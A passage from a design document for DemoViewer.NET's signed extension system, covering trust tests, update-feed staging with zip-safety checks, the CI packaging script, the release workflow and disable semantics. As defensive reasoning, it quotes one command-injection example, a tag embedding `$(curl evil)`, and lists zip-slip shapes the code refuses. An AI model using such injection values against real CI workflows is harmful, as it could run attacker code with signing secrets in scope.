`PublisherKeys.Current`; `SignedOrOptIn` trusts a signed directory without the env var, trusts an
unsigned one only with it, and (a documented edge, not a new rule) the opt-in still bypasses a directory
signed by the wrong key since it does not inspect the directory at all; `PublisherKeys.Current`'s one
entry imports as a NIST P-256 key. `ExtensionLoaderTests.cs` gained two cases: `Resolve` loads a staged
copy of the real extension signed with a freshly generated key, no env var set; the same staged copy
with one byte flipped in the DLL is rejected as `Untrusted` with detail "a file changed after signing".
No test commits a private key; every test that signs something generates its own ephemeral key pair and
injects the matching public half.

---

### 2.10 Update feed and staging

Everything here lives in the app under `DemoViewer.NET.Extensions.Updates` (`ExtensionFeed` and
`ExtensionFeedEntry`, `IExtensionFeedClient` and `HttpExtensionFeedClient`, `ExtensionFeedSource`,
`ExtensionUpdateService`, `ExtensionUpdateState` and `StageResult`, `ExtensionStaging`) plus
`ViewModels/Settings/ExtensionUpdateRow`. Only the Desktop head constructs the service: the browser has no
config root to stage into, and its Settings line says updates come with the app. The service loads
nothing; a staged copy is what the loader takes at the next start.

**The feed.** One `extensions.json` per extension, hosted as a GitHub release asset. The default URL is
`https://github.com/<owner>/<repo>/releases/download/extensions-<id>/extensions.json`, with the repository
from the constant `GitHubReleaseNotesService` already reads (`ExtensionFeedSource.DefaultTemplate`): one
rolling release per extension, tagged `extensions-<id>`, whose asset the release workflow replaces on every
extension release. The setting `Extensions.FeedUrl` may name another https URL, with `{id}` standing for the
extension id; anything that is not https falls back to the default. The feed's origin is not the gate:
the signed zip is what the trust policy judges.

```json
{
  "id": "net.demoviewer.pack.stratbook",
  "entries": [
    {
      "version": "1.0.1",
      "manifest": { ...the extension.json inside the zip, verbatim... },
      "url": "https://github.com/<owner>/<repo>/releases/download/net.demoviewer.pack.stratbook-v1.0.1/DemoViewer.NET.Extensions.StratBook-1.0.1.zip",
      "sha256": "<64 hex characters, the zip's SHA-256>",
      "size": 4718592,
      "publishedAt": "2026-10-03T12:00:00Z"
    }
  ]
}
```

| Member | Required | Meaning |
|---|---|---|
| `id` | yes | The extension id; every entry's manifest must carry it. Only `[A-Za-z0-9._-]`, since it names a folder. |
| `entries` | yes | Every published version, in any order; parsed highest first. At most 500. |
| `entries[].version` | yes | SemVer 2.0; must equal the manifest's `version`. No two entries share one. |
| `entries[].manifest` | yes | The section 2.7 manifest, so the app can judge a version before downloading it. Parsed by the same strict parser; must name `id`. |
| `entries[].url` | yes | The zip, an absolute https URL. |
| `entries[].sha256` | yes | The zip's SHA-256, hex, either case. |
| `entries[].size` | yes | The zip's length in bytes, positive. |
| `entries[].publishedAt` | no | An ISO 8601 timestamp. |

Unknown members are ignored, comments and trailing commas accepted, so a newer feed reads on an older
app. The feed is capped at 4 MB before it is parsed.

**The zip the release workflow must produce.** Flat, with the manifest at the root, exactly what the loader expects
under `extensions/<id>/<version>/`:

```
DemoViewer.NET.Extensions.StratBook.dll   the assembly the manifest names
DemoViewer.NET.Extensions.StratBook.xml   its documentation file, when built
extension.json                            the manifest; id and version equal the feed entry's
extension.sig                             the signature over the directory (section 2.9)
<culture>/...                             any satellite directories, kept as they are
```

Nothing is renamed, dropped or added on the way to disk: the signature verified at load is the
signature that came out of the zip. A zip is refused for more than 4096 entries, more than 512 MB of
content (the feed's `size` is held to the same cap), an entry whose stream is longer than it declares,
an entry whose Unix mode bits say symlink (`ZipArchive` would write the target text as a file; refused
anyway), two entries whose names differ only by case (one file on macOS and Windows), or an entry whose
name is rooted, carries a drive letter, a `..`, `.` or empty segment (split on both separators, since a
Windows-written zip may carry backslashes and on Unix a backslash is a legal file-name character), or
that resolves outside the target directory. The id rule is one constant for the manifest and the feed
(`ExtensionManifest.IsValidId`): a leading dot is refused at parse time, not hidden by the loader's dot
folder skip.

**The check.** `ExtensionUpdateService.CheckAsync` fetches every declared extension's feed as one queue
item at user priority (the user pressed the button or opened Settings) and computes one
`ExtensionUpdateState` per pack. Installed is the running copy's manifest version and `PackSource`.
Offered is the highest entry newer than installed that `IsOffered(entry, host)` accepts. Latest is the
highest entry overall, offered or not, with `LatestCompatibility` when it is newer and not offered, so
Settings can say what a newer version needs. Pending is a version already staged on disk that the loader
would take at the next start: the highest `extensions/<id>/<version>/` above the running version that
passes the section 2.7 check. The status, in order of precedence: `UpdateAvailable` when something is
offered and it is newer than any pending copy; `PendingRestart` when a pending copy exists; `NeedsNewerApp`
when the latest is newer and nothing is offered; else `UpToDate`. A feed that cannot be fetched is
`FeedUnreachable` and one that does not parse, or is for another extension, is `FeedInvalid`, each with a
user-terms `Error` and the exception message on `LogDetail` for the log only; a pack whose own manifest
did not read is `Unknown`. Nothing throws. The service remembers the last state per pack for the run
(`LastStates`, `LastState(id)`).

**The pinning rule's predicate.** `IsOffered` is the one place the pinning rule (section 4) lands.
`ExtensionUpdateService.DefaultIsOffered` is option (B): `PackCompatibility.Check(entry.Manifest, host)`
accepts it. Option (A) replaces the predicate passed to the constructor with one that reads the
CI-written `builtAgainst` block from the entry's manifest and compares it with the running versions; the
loader's own check (section 2.8) gets the matching change. Nothing else in the service or in Settings
knows which option is in force. A predicate that throws offers nothing.

**Download and staging.** `DownloadAndStageAsync(entry)` is one queue item at user priority, cancellable,
and never throws; it returns a `StageResult` of `Installed`, `AlreadyInstalled`, `Refused` (with the
reason in user terms) or `Cancelled`. In order:

1. `extensions/<id>/<version>/` already exists: `AlreadyInstalled`, nothing is fetched or changed.
2. The zip streams to `extensions/.staging/<id>/<version>.zip.part`, bounded by the feed's `size` (the
   client stops at one byte over and refuses a `Content-Length` above it). The `HttpClient`'s own timeout
   is off, since it would span the body too; the headers get 30 s, and the body a 60 s stall budget per
   read, so a slow download that keeps arriving completes. Progress (bytes received of total) reaches the
   Settings row and the queue item.
3. The file's length must equal `size`, then its SHA-256 must equal `sha256`. Nothing is opened before
   both pass.
4. The zip unpacks into `extensions/.staging/<id>/<version>/` under the rules above, planned before anything
   is written.
5. `extension.json` must exist at the root, parse, name the entry's id and version, and the assembly it
   names must be beside it.
6. The loader's `ITrustPolicy.Judge` (`TrustPolicy.Default`, the same value `Program.Main` hands the
   loader: section 2.9's signature check, or the developer opt-in) is asked about the unpacked directory
   and its manifest. A refusing verdict's `Reason` is the refusal detail Settings shows ("a file changed
   after signing", "signature invalid", ...) and its `LogDetail` goes to the log; a policy that throws
   reads as untrusted.
7. One `Directory.Move` to `extensions/<id>/<version>/`. A target that appeared in the meantime is
   `AlreadyInstalled`. The `.zip.part` and the empty `.staging/<id>/` go.

Any refusal or error removes the `.zip.part` and the unpacked directory; a cancellation does the same.
Every delete is guarded the way `PackDataRemover.ResolveSafe` guards (strictly inside `extensions/`, never
through a reparse point, never a `.dem`), and `ExtensionLoader.Discover` skips dot folders, so an
unfinished download is never reported as a broken candidate.

**At startup.** `CleanupOnStartAsync`, a background queue item from the composition root after the
loader's report: removes `extensions/.staging/` whole (a download the last run did not finish), then every
staged version of a declared extension that is not newer than the running copy and is not the directory
the running copy loaded from. Newer versions stay, even ones the loader refused today, since they may load
after an app update. Nothing outside `extensions/` is touched.

**Settings.** Under Extensions, each extension's master row carries one update line (`FeatureToggleRow.Update`,
an `ExtensionUpdateRow`): the verdict, a Check button (always, unless a download runs), an Update button
while a version is offered, a Cancel button and a progress bar while one downloads. Opening Settings checks
every feed when `Extensions.LastUpdateCheckUtc` is unset or at least an hour old, and records the time
after every finished check; within the hour the rows seed from the service's remembered verdict. The copy,
one sentence per state:

| State | Line |
|---|---|
| not checked this run | (empty; the Check button is the invitation) |
| checking | `Checking for updates…` |
| `UpToDate` | `Up to date.` |
| `UpdateAvailable` | `1.0.1 available.` and the Update button |
| downloading | `Downloading 1.0.1: 1.2 of 4.5 MB`, the bar and Cancel |
| `PendingRestart` (and after a successful download) | `1.0.1 installed, restart to use it.` |
| `NeedsNewerApp` | `1.2.0 available but needs app contract ^2.0 (this app provides 1.0.0).`, or the CS2DemoKit or app-release form |
| `FeedUnreachable` | `Could not check for updates: the update feed could not be reached.` |
| `FeedInvalid` | `Could not check for updates: the update feed could not be read.` |
| `Unknown` | `Updates cannot be checked: the extension's own manifest could not be read.` |
| a refused download | the offer stands, plus an amber `Update 1.0.1 could not be installed: <reason>.` |
| browser head | `Updates come with the app.`, no buttons |

Copy says "extension" and "update", never "pack". The UiCapture variants
`settings-extensions-update-available` and `settings-extensions-update-installed` render the two states
users will meet most.

**Logging.** Under `App.Extensions`: `Extension <id> update check failed (<status>): <detail>`,
`Extension <name> <version> staged at '<dir>'; it loads at the next start`,
`Extension <name> <version> update refused: <detail> [<exception>]`, and
`Removed staged extension directory '<dir>' (<reason>)` from the startup sweep.

**Verified.** `ExtensionFeedTests` (the schema and every refusal), `ExtensionUpdateServiceTests` (every
check state, the pinning rule's predicate as the only gate, wrong sha and size, five zip-slip shapes, a
missing or mismatched manifest, an untrusted copy with the staging directory gone, a successful stage with
every file intact and `PendingRestart`, an existing target as a no-op, a cancellation leaving no partial
file, every step a user-priority `ExtensionUpdate` queue item, the startup sweep keeping the running and
newer copies, and the real extension output zipped and signed with an ephemeral key installing through a
`SignedTrustPolicy` while the same zip with one byte of the DLL changed after signing is refused with the
signature check's reason), one `ExtensionLoaderTests` case that stages through the service and discovers the result
while ignoring `.staging`, and the Settings cases in `SettingsViewModelTests`.

---

### 2.11 CI and packaging

**`scripts/pack-extension.sh <id> [--key <private.pem>] [--dry-run] [--out <dir>]`.** Bash, runs the same
way locally and in CI. In order:

1. Reads the host values this build offers (`ContractVersion`'s literal from `ExtensionHost.cs`, the
   `CS2DemoKit.Analysis` pin from `Directory.Packages.props`) from source rather than keeping its own
   copy, and fails if either grep does not find exactly one match.
2. Reads the manifest's own `version` and `assembly`; if `GITHUB_REF` is `refs/tags/extensions/<id>/v*`,
   the tag's version must equal the manifest's (pack-velopack.sh's own tag/version guard, same shape);
   otherwise the check is skipped, not failed, since a dispatch run or a local invocation names no tag.
3. Builds `tools/extension-signing` and the extension project (`dotnet build`, Release, no `-r`:
   framework-dependent, AnyCPU, since the extension is managed-only and loads into the app's process on
   every OS).
4. Stages exactly what the extension project itself produces. The built `.deps.json`'s own entry for
   the project (keyed `<AssemblyName>/<nbgv-version>`) lists, under `runtime` and `resources`, only the
   files that project's own compile output contributes; every referenced project and package is a
   separate entry, never folded in. The script copies every path each of those two lists names (not a
   hardcoded `<AssemblyName>.dll`), so this is "the project's own output minus every reference" without
   hand-walking a reference closure. A `native` or `runtimeTargets` key on that same entry would mean a
   RID-specific asset the extension itself ships, which this script refuses to package, stopping with an
   error rather than shipping a half-correct zip (the shipped extension has none today). The `.xml` doc
   file is staged separately when the build produced one (`deps.json` does not track it); the manifest
   staged is the repo copy, not the build's `PreserveNewest` copy beside the DLL, though the next step
   proves them equal.
5. Reads the manifest embedded in the built DLL (`extension-signing manifest <dll>`, straight out of the
   PE's resource metadata, no assembly load, written with `Console.Out.Write` rather than `WriteLine` so
   the output carries no extra trailing newline the embedded text did not already have) and `cmp`s it
   byte for byte against the repo file, never a string compare through `$(...)` (which would silently
   swallow a trailing-newline difference).
6. Prints `CompatibilityReport.Describe` for the manifest against the host values from step 1
   (`extension-signing report <manifest.json> --contract <ver> --cs2demokit <ver>`) and fails the whole
   run if it is not compatible: a release workflow should not ship a pairing it already knows cannot
   load.
7. Signs the staged directory. `--dry-run` never reads `DV_EXTENSION_SIGNING_KEY`, signed or not: a
   dry run signs only with an explicit `--key` (expected to be an ephemeral `extension-signing keygen`
   key, never in `PublisherKeys.Current`, so verification is told to check against that key's own
   public half instead), so the production key can never end up on an unpublished artifact even if a
   caller sets the secret alongside `--dry-run`. A real run reads `DV_EXTENSION_SIGNING_KEY` into a
   `mktemp` file (`chmod 600`, removed by a `trap ... EXIT`) and verifies with no override, against
   `PublisherKeys.Current`, so a secret that is not the key behind `Primary` fails here rather than
   shipping a zip no app will trust. A real run with no key available fails outright with the action
   below; a dry run with none notes it and ships an unsigned zip.
8. Zips the staged directory deterministically (`extension-signing zip`, `DeterministicZip` below:
   entries sorted ordinal by `/`-path, every entry's timestamp fixed to 1980-01-01 and its Unix mode
   normalized to `0644`, no directory entries) to
   `<out>/<AssemblyName>-<version>.zip`, then unzips it to a scratch directory and diffs its file list
   against the staged one and (when signed) re-verifies the unzipped copy: the loader extracts this
   archive, not the staged directory, so a zip-tool bug would otherwise go unnoticed. Writes
   `<zip>.sha256` as `<hex>  <name>`, the form `sha256sum -c` reads.
9. Emits the feed entry fragment (version, the manifest verbatim, the computed release-asset url, the
   zip's sha256 and size, `publishedAt`) to `<out>/feed-entry.json`, the exact shape `ExtensionFeedEntry`
   parses (section 2.10). Self-tests it by merging it into an empty feed
   (`extension-signing feed-merge <nonexistent> feed-entry.json --id <id> --out ...`) and feed-checking
   the result, so the fragment is proven to parse as a real entry, not merely as JSON.

Every step fails loudly (`set -euo pipefail` plus explicit checks); nothing is skipped silently, and
there is no flag anywhere that bypasses a check the way `git commit --no-verify` would.

**Five new `tools/extension-signing` commands beyond `keygen`/`sign`/`verify`,** all linking source from
the app the same way `ExtensionSignature.cs`/`PublisherKeys.cs` already did, never referencing it (still
no Avalonia in this tool):

- `report <manifest.json> --contract <ver> --cs2demokit <ver> [--app-version <ver>]` links
  `SemVersion.cs`, `VersionRange.cs`, `ExtensionHostInfo.cs`, `ExtensionManifest.cs`,
  `PackCompatibility.cs` and `CompatibilityReport.cs`, all pure value types with no dependency beyond
  each other and the BCL. It takes the host's three values as arguments rather than linking
  `ExtensionHost.cs`, which would pull in `AppVersionInfo` and, through it, `GitHubReleaseNotesService`
  and the app's own `IReleaseNotesService` surface for one static method: `CompatibilityReport.Describe`
  already takes an `ExtensionHostInfo` explicitly rather than reading `ExtensionHost.Current` itself, so
  nothing here needed to change for this to work. Exits non-zero when the verdict is `Incompatible`;
  `CompatibilityMatrixTests` remains the release gate that proves this script's inputs are exactly right,
  this command is only what prints the same verdict during packaging.
- `manifest <assembly.dll>` links nothing new: it reads the `extension.json` manifest resource directly
  out of the PE's metadata tables (`System.Reflection.Metadata.PEReader`) and prints its raw bytes,
  without loading the assembly. Loading it (even reflection-only, through `MetadataLoadContext`) would
  put the extension's referenced assemblies on this tool's probe path for no reason: nothing here runs
  any code from the DLL, only reads a resource every managed assembly carries as ordinary PE data.
- `zip <dir> --out <zip>` is `DeterministicZip` (`tools/extension-signing/DeterministicZip.cs`, under
  `DemoViewer.NET.Extensions.Loading` beside the signing types): a manual walk refusing a reparse point
  the same way `ExtensionSignature.Walk` does (a second implementation, not shared, since the two walks
  keep different files: this one keeps `extension.sig`, the digest walk skips it), sorted entries, a
  fixed `ZipArchiveEntry.LastWriteTime` (1980-01-01, the DOS epoch) and `ExternalAttributes` (Unix
  `0644`) on every entry so two zips of the same tree hash the same regardless of the machine's clock or
  umask. Verified by zipping the same staged, unsigned directory twice within one run and diffing the
  sha; a resigned build's zip differs in `extension.sig`'s `signature` field alone, since ECDSA signing
  draws a fresh random nonce every time, never in the digest or anything the zip mechanism controls.
- `feed-merge <existing.json> <entry.json> --id <id> --out <merged.json> [--allow-downgrade]` and
  `feed-check <feed.json>` link `ExtensionFeed.cs` (already linking `ExtensionManifest.cs` et al. for
  `report`). The merge itself is `ExtensionFeedMerge.Merge` in its own file,
  `tools/extension-signing/FeedMerge.cs`, under `DemoViewer.NET.Extensions.Updates`: it operates on
  `System.Text.Json.Nodes.JsonNode` rather than the `ExtensionFeed` records, so a member this app does
  not parse yet (a future one) round-trips untouched instead of being dropped by a record rebuild, and
  validates the merged result with `ExtensionFeed.Parse` before returning it. Rules: an entry whose
  version matches one already in the feed replaces it in place, at whatever position it held, and never
  counts as a downgrade (correcting a shipped version is not publishing something older); a version that
  matches nothing existing and is higher than the current highest is always accepted; one that is lower
  than or equal to it is refused unless `--allow-downgrade`; the result is always sorted highest first.
  `tools/extension-signing/FeedMerge.cs` is also linked into
  `src/App/DemoViewer.NET.App.Tests/DemoViewer.NET.App.Tests.csproj` (one more `<Compile Include>`
  beside the four already linked back from the extension test project), so `ExtensionPackagingTests` exercises the rules directly in C#, not only
  through the CLI; its fixtures are `FakeFeeds`' existing entry/feed builders, the same ones
  `ExtensionFeedTests` and `ExtensionUpdateServiceTests` use, so a fragment the test builds is exactly
  the shape the script itself writes.

**The zip, as produced**, matches section 2.10's layout exactly:

```
DemoViewer.NET.Extensions.StratBook.dll
DemoViewer.NET.Extensions.StratBook.xml
extension.json
extension.sig                             present whenever a signing key was available
```

No satellite culture directories exist today; the staging step copies one when the build's `.deps.json`
lists a `resources` entry for it, at its own relative path.

**The tag convention.** A real release is cut by pushing `extensions/<id>/v<version>` (for example
`extensions/net.demoviewer.pack.stratbook/v1.0.1`), which the script's own check requires to agree with
the manifest's `version`. That is a different string from section 2.10's release tag for the zip itself,
`<id>-v<version>` (`net.demoviewer.pack.stratbook-v1.0.1`, no slashes, matching the URL
`ExtensionFeedSource`/`ExtensionFeed`'s example already assumed before this workflow existed to build it)
and from the rolling feed release's tag, `extensions-<id>`. Three different tags for three
different reasons: the first triggers the workflow and is checked, not shown to users; the second holds
one version's assets and never changes; the third holds the one `extensions.json` every version's entry
is merged into and is replaced on every release.

**`.github/workflows/release-extension.yml`.** Triggered by a push matching `extensions/*/v*`, or
`workflow_dispatch` with an `id` input (`type: choice`, the one known id today), a `dry_run` input
(default `true`) and `allow_downgrade` (default `false`). Two jobs, `build-and-pack` (`contents: read`)
and `publish` (`needs: build-and-pack`, `contents: write`, gated on `do_publish`), so the write token
and the signing secret are both out of scope for a dry run's job entirely, not merely unused by it.

Every value that can carry attacker-supplied text (`github.event.inputs.*`, a ref-derived id) is passed
through a step's `env:` and read back as a shell variable, never interpolated as `${{ }}` into `run:`
script text: GitHub expands `${{ }}` into the script's source before the shell ever runs it, so a tag
named `extensions/$(curl evil)/v1` or a crafted dispatch input would otherwise execute on the runner,
signing secret and write token both in scope. `build-and-pack`'s first step resolves the id this way
(from the tag when the ref is one, else the input) and refuses it outright unless it matches the
manifest's own id shape (`ExtensionManifest.IsValidId`) before anything downstream touches it; it also
resolves `do_publish`: a tag push always publishes, a dispatch run only when its ref IS that same tag
and `dry_run` is explicitly `false`, every other case (including any dispatch from a branch) is a dry
run regardless of the input, since a branch is never the thing a release tag names. `github.sha` and
`github.repository` stay as direct `${{ }}` text (not user-suppliable; the existing convention in
`release.yml`), everything else moves through `env:`.

`build-and-pack` then runs the ext suite's standard tier, builds `App.Tests`, runs
`CompatibilityMatrixTests` alone, then `pack-extension.sh` (`DV_EXTENSION_SIGNING_KEY` passed only when
`do_publish == '1'`; `--dry-run` appended otherwise, and the script itself refuses that secret in
`--dry-run` regardless, so the gate holds even if a caller wires the secret unconditionally some other
way), and uploads the zip, its sha256 and the feed entry fragment as a workflow artifact on every run,
so a dry run's output is inspectable from the Actions UI without re-running anything.

`publish` runs only when `do_publish == '1'`, downloads that artifact, and merges and validates the
rolling feed **before** touching the per-version release: a refused downgrade (or any other merge
failure) then leaves nothing created or uploaded, never an orphan release with no feed entry. Fetching
the existing feed treats "absent" (`gh release view extensions-<id>` reports no such release) as the
only "no feed yet" case, since this run is then the one that creates that release; a release that
exists but carries no `extensions.json` asset is left alone and fails the job, since that is an
anomalous state (a prior run died mid-publish, or the asset was removed by hand) that needs manual
repair, not a silent restart from empty. Any other `gh` failure (auth, a rate limit, a transient API
error) also fails the job outright, for the same reason: taking "the download failed" as "there is no
feed" would republish a one-entry feed over a real one with every other version's history in it.

Only once the merge and `feed-check` succeed does `publish` create or update the per-version `gh
release` under the `<id>-v<version>` tag with the zip and its sha256 as assets (idempotent against a
re-run: `gh release view` first, `upload --clobber` if it already exists, `create` only if it does
not), `--latest=false` (so this release never becomes GitHub's "latest", which would misdirect anyone
browsing releases by eye; it has no bearing on how either Velopack's `GithubSource` or
`vpk download github`'s delta seed pick the app's own release, since both walk the release list looking
for an asset literally named `RELEASES`/`releases.<channel>.json`, never relying on "latest"). It then
compares the uploaded asset's actual `.url` (`gh release view --json assets --jq`, the field confirmed
by hand against a real release in this repo; the same call's `.apiUrl` is the API endpoint, not the
download link) against the url the feed entry fragment already computed, failing on any mismatch. Last,
it creates the rolling release (only if it did not already exist) and uploads the already-merged
`extensions.json`, `--clobber`; the local file is named `extensions.json` before upload, not renamed
through `gh`'s `#label` syntax, which sets a display label, never the served file name.

**Concurrency.** A constant group, `release-extension`, not keyed on the id: with one extension this
costs nothing (there is nothing else to serialize against), and it sidesteps needing the id before a
job starts at all. A second extension that wants independent release cadences needs a per-id group fed
by a job's own output to a dependent job, the shape `publish` already uses for `do_publish`.

**The `ci.yml` dry-run step.** The `build` job, after the normal solution build, runs
`pack-extension.sh net.demoviewer.pack.stratbook --dry-run` with no signing key, catching a packaging
regression (a file the deps.json-derived staging list stops picking up, a manifest edited without a
rebuild, a compatibility report gone `Incompatible`) on every PR rather than only when a release is cut.
`release.yml` is untouched: it does not run on pull requests, and the app installer already bundles
whichever extension version the heads reference at app release time with no change needed here.

**Action before the first release.** Same secret `DV_EXTENSION_SIGNING_KEY` section 2.9 names: store the private key
`keygen` wrote (outside every git working tree) as that GitHub repository secret, the same way
`DV_SIGN_*`/`DV_NOTARY_PROFILE` already work in `release.yml`. Until it is set, a real (non-dry-run) run
of this workflow fails at the signing step with that fact stated plainly; a dry run (the dispatch default)
works with no secret at all.

**Versioning.** The extension's version is computed, not edited. `src/Extensions/StratBook/version.json`
is a Nerdbank.GitVersioning file that inherits the root one and sets `version` to `0.1`, so the extension
is `0.1.<height>` where the height counts the commits that touched `src/Extensions/StratBook/` (its
`pathFilters` are `.` and an exclusion for the test project) since that line was last changed;
`versionHeightOffset` is -1 so the commit that introduced the file reads `0.1.0`. A change anywhere else
in the repo leaves the extension's version alone, which is what the independent-cadence structure rule asked for;
that includes `src/Sdk/DemoViewer.NET.Extensions.Sdk/build/DemoViewer.NET.Extensions.Sdk.targets` itself, one level up, so a fix to the stamping
ships under the extension's current version. Its `publicReleaseRefSpec` is `main`, the app's own `v*`
release tags (an app release builds from its tag, not from `main`, and bundles the extension, so the
bundled copy must read clean) and the extension's release tags; a build off any other ref carries a
`-g<sha>` prerelease label and sorts below the release it precedes. Two such dev builds of the same
`major.minor.patch` compare by the hash text, which says nothing about which is newer: the loader's
"strictly newer than shipped" rule is only meaningful between releases, or between a release and a dev
build. `release.tagName` is `extensions/net.demoviewer.pack.stratbook/v{version}`, which is what
`nbgv tag` creates, from the plain `major.minor.patch` on any commit.

The committed `extension.json` is a template whose `version` is the literal `{version}`.
`src/Sdk/DemoViewer.NET.Extensions.Sdk/build/DemoViewer.NET.Extensions.Sdk.targets`, imported by the extension csproj, runs before
`AssignTargetPaths` (after NBGV's `GetBuildVersion`), writes the template with `$(NuGetPackageVersion)`
in place of the placeholder to `obj/.../extension.json`, and adds that file as the embedded resource and
the copy beside the DLL; the placeholder must appear exactly once or the build fails. A second extension
would import the same file and get the same behaviour from its own `version.json`. `pack-extension.sh`
asks `nbgv` for the version first (restoring the tool manifest if needed), checks the tag against it
before building, and, since the tag is itself a public-release ref and reads clean from any commit, a
real run also refuses a tagged commit that is not on `origin/main`. After the build it checks that the
stamped copy says that version, equals the embedded copy byte for byte, and equals the template with the
placeholder filled in. `CompatibilityMatrixTests` asserts
the same three things from the test binary's side, plus that the manifest's major.minor.patch equals the
assembly's informational version. The first minor of the extension is 0.1; `requiresHost` is unchanged.

**Cutting a release, step by step.** Merge the change to `main`, then on that commit run
`dotnet nbgv tag -p src/Extensions/StratBook` and push the tag it prints
(`extensions/net.demoviewer.pack.stratbook/v<version>`). Nothing is bumped by hand; the tag must agree
with the computed version or the workflow refuses it. The workflow builds, tests, signs, zips, creates the
release and updates the feed with no further action; watch its run in the Actions tab. To preview without
publishing, dispatch the workflow by hand with `dry_run` left at its default and read the artifact it
uploads. `dotnet nbgv get-version -p src/Extensions/StratBook` shows what the next tag would be.

**What is not yet done.** Section 2.8 leaves the rename of the shipped manifest copy from the
bare `extension.json` to `<id>.extension.json`, needed once a second extension ships beside this one in
the same output directory; that touches `ShippedPack.BesideApp`, the app csproj and the loader/matrix
tests, none of them a release workflow's hot file, so it is deliberately left for whichever
change adds that second extension, not done here.

---

## 3. Disable semantics

"Off" means, per resource:

| Resource | When turned off at runtime | After restart with it off |
|---|---|---|
| UI (tabs, sections, panes, lanes, menus, keybinds, settings pages, chips) | Gone immediately (gate is already live; sections reconcile by identity) | Never built |
| Background jobs (evaluators, mining, inbox, lineup clips, migrations) | Evaluators stop at the next `Wants()` poll; queued jobs owned by the pack are cancelled by owner tag; a job already running finishes its current unit | Never queued |
| Indexing passes (Round Index, Grenade walk, Suggested Tags, Round Facts if pack-owned) | Stop at the next demo; nothing new written | Not run. Library indexing does strictly less work |
| Resident memory (`SituationIndex`, `GrenadeIndex`, `SignatureCache`, cached VMs) | Released in session (the in-session release rule; see the live toggle below) | Not allocated |
| Startup cost (index loads, Team Identity rebuild, store construction) | n/a | None |
| Data on disk (the pack's config-root and cache-root stores, cache sidecars, record fields) | Kept, untouched | Kept, untouched |

**Existing data.** Nothing is deleted when the pack is turned off. The settings page can offer "Delete
Strat Book data" as a separate, confirmed action that removes the paths in the pack's `StoreDescriptor`s;
cache sidecars are regenerable, `strats/`, `tags/`, `teams.json`, `review-queue.json` and the dossier
stores are user work and must be called out by name in the confirmation.

**Round Facts while off.** Both the writer and the reader are gated: `RoundFactsEvaluator` writes
nothing and `RoundFactsSource` answers "no rows" and forwards no `Updated`, so winner tints, situation joins
and tag labels go with the pack rather than showing rows written while it was on. The rows stay in the cache
records and come back with the pack; a bare run cached under one gate state is not served under another.

**Stale cache while off.** Library keeps indexing new demos without pack passes. The pack fields of those
records are absent, or the `Packs` entry itself is missing. Fields of records indexed
before the switch stay as they were.

**Re-enabling.** The pack's evaluators report every demo whose pack fingerprint is missing or stale through
`PendingPaths()`, which is the existing mechanism, so re-enabling backfills automatically. The cost is a
re-index of everything indexed while off, which on a large library is the same order as a first index.
Round Facts is in the pack, and the highlights fingerprint already excludes it, so a toggle does not force
a library-wide Reels re-scan. The settings page should say so ("N demos will be re-indexed in the background") and the backfill should
be visible and pausable in the queue, per the standing rule that all background work goes through it.

**Live toggle, as built.** Live in both directions, and turning off releases the pack's memory in
session (the in-session release rule). A core `PackSwitch` subscribes to the gate's `Changed` once per pack and acts on real
transitions only: the resolved `IsEnabled(pack.FeatureId)` against the state the lifecycle was last put in,
so a settings write that leaves the pack where it was does nothing. `App.StartPacks` is its startup pass.

- *Off to on:* `OnEnabledAsync(EnabledInSession, ct)`, the same code path as startup: one attach item
  first ("Strat Book: attach services", which attaches the lineup clips, Team Identity (its file read and
  `StartAsync` are queued from inside it, so the Library team filter is not held behind the index loads),
  the facts refresher, the zone graphs and every resident built lazily before a release), then the two
  index loads, all queue items at user priority on the pack's serial; then a user-priority `SectionCompute`
  item on the same serial, owned by the pack id ("Strat Book extension: find demos to re-index"), re-polls
  the library through the coordinator, so the pack's evaluators submit every demo whose pack fields are
  missing or stale and the backfill is visible and pausable in the queue. Open 2D Playback tabs and the
  shell react through the gate's `Changed` as before.
- *On to off:* the enable's token is cancelled, every queued pack item goes by owner tag through
  `IDemoProcessingQueue.CancelOwned(ownerTag)` (a running one finishes its unit; a parse the library co-owns
  stays), and the release itself is one `SectionCompute` item at user priority, owner the pack id, on the
  same serial, so a large index never leaves memory on the UI thread and never beside a load still running.
  `OnDisabledAsync` returns that item's completion.
- *Ordering.* Every item of the pack's own (loads, attach, release) shares one serial, so nothing of the
  pack's state changes outside a totally ordered item, and each carries the lifecycle epoch it was queued
  under: every enable and disable bumps it, an enable also drops a release still queued (by owner), and an
  item that runs under an older epoch does nothing. So a fast off-on leaves everything attached and the
  live view intact (shutdown's lineup flush still writes), and a fast on-off leaves nothing loaded.
- *What release means.* The residents are container singletons that core surfaces hold references to
  (Team Identity for the Library filter, the situation index for the shell), so the object cannot be
  replaced; its state can. Each implements `IExtensionResident`: `Release` unsubscribes from the sources that
  would refill it (`DemoCacheStore.Changed`, the evaluators' `Written`/`Indexed`, the index's `Changed`),
  writes anything pending (lineups, the signature cache) and drops the loaded data; `Attach` subscribes
  again and the next load rebuilds. Released: `SituationIndex`, `GrenadeIndex` (and its lineup document),
  `TeamIdentityService` (side keys, assignments, joins, both files), `LineupClipService` (plan, ranks,
  requests), `TagFactsRefresher`, `WatchedSituationsService` (the new-hit groups; the saved watches stay),
  `StratMiningService` (the quiet timer, the patterns, the `SignatureCache`), and the zone graphs in
  `AssetZonePlaceResolverSource` (only pack code reads them). `StratBookPackInstances` keeps the built
  residents across a release and nulls its typed view, so shutdown flushes nothing that was dropped and a
  re-enable restores and re-attaches everything built lazily before the release. A mine or a lineup render
  still running in the heavy lane when the release runs (their items set no serial) skips its next step
  once detached and writes nothing back; the release lets it end (bounded by one batch) before dropping the
  signature cache, which is not thread-safe.
- *Not released:* the pack's tab view-models (container singletons the modules hand to the shell; their
  result lists are bounded by the last query and their map assets by the last map shown) and the pack's
  small user-truth stores (strats, tags, dossier notes, veto history, proposals, profile, site regions),
  which are the user's files and cheap. The hub shows no "stopping" state: its tab is gone the instant the
  gate flips; the release item is visible in the queue instead.
- *First run.* On a fresh desktop install `StartPacks` waits while `SettingsService.NeedsFirstRun` is true;
  the wizard's Finish or Skip writes settings, which is a gate change like any other, and the pack starts
  if its answer resolves on (accept, or Skip with the default) and stays unbuilt if it resolves off. The
  browser never shows the wizard and never waits. Upgrades with the flag set start as today. The library
  contributions moved the Library filter's and the provenance chip's resolve of Team Identity and the
  provenance source off the shell's own constructor and into the two contributions, reached only while
  each one's gate is on. With the pack explicitly off that means neither service is built at shell
  construction at all. With the pack on, the default, the Library's own constructor reaches the same
  resolve at the same moment the old eager constructor injection did (its first `RebuildFilters`), so the
